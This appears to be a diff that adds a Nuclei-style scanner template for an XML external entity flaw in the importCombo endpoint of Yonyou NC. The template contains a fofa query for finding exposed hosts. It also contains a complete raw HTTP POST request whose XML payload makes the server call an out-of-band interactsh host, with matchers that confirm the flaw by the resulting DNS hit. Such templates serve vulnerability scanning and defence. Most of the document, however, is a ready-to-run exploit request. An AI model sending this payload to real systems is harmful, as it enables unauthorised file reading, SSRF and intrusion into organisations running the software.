@@ -1,0 +1,34 @@
+id: yonyou-nc-importcombo-xxe
+info:
+  name: "用友 NC importCombo 接口XML外部实体注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+        用友NC系统在importCombo接口处理XML数据时存在外部实体注入漏洞。攻击者可通过构造包含恶意实体定义的XML文档，利用该接口触发实体解析过程，实现服务器端文件读取、内网服务探测（SSRF）等攻击行为，最终可能导致敏感配置信息泄露或系统权限被非法获取。
+  tags: 用友NC
+http:
+- raw:
+  - |
+    POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+    %remote;]>
+    <root/>
+    ------WebKitFormBoundary--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
